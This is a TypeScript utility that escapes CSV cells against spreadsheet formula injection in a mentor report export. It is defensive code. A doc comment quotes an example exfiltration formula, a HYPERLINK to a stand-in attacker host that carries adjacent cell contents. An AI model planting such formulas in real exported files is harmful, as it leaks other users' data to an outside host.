// Characters that make Excel, LibreOffice Calc and Google Sheets treat a
// cell as a formula rather than text. Tab and CR are included because both
// are stripped during parse, exposing whatever follows them.
const FORMULA_TRIGGERS = ['=', '+', '-', '@', '\t', '\r']

/**
 * Escape one value for a CSV cell.
 *
 * Quoting alone is NOT enough. `"=HYPERLINK(...)"` is perfectly valid CSV
 * quoting, but spreadsheet software strips the quotes while parsing and
 * then evaluates the cell -- so a value that arrived from another user
 * becomes a live formula in the reader's spreadsheet. In the mentor
 * report export the goal titles and task names belong to the *mentee*, so
 * this is a cross-user channel: a mentee names a task
 *
 *   =HYPERLINK("https://evil.tld/?d="&A1,"Open full report")
 *
 * and the mentor who exports and opens the CSV leaks adjacent cells to the
 * attacker's host on click.
 *
 * The fix is to prefix a single quote, which every major spreadsheet reads
 * as "the rest of this cell is literal text". The prefix is applied before
 * the usual quote-doubling so the two compose correctly.
 */
export function escapeCsvCell(value: unknown): string {
  const raw = value === null || value === undefined ? '' : String(value)
  const neutralized = FORMULA_TRIGGERS.includes(raw.charAt(0)) ? `'${raw}` : raw

  return `"${neutralized.replace(/"/g, '""')}"`
}

/** Join already-collected rows into a CSV document, escaping every cell. */
export function buildCsv(rows: unknown[][]): string {
  return rows.map((row) => row.map(escapeCsvCell).join(',')).join('\n')
}
